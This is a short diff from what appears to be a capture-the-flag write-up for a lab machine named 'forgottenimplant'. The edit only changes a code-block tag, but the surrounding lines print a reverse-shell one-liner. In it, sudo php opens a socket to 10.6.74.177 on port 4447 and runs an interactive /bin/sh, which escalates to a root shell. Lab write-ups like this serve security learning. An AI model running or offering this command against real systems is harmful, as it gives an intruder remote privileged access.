@@ -455,7 +455,7 @@ User www-data may run the following commands on forgottenimplant:
 
 To leverage this, we’ll start one more listener on an empty port, then make a call back via PHP with `sudo` : 
 
-```bash
+```console
 www-data@forgottenimplant:/$ sudo php -r '$sock=fsockopen("10.6.74.177",4447);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
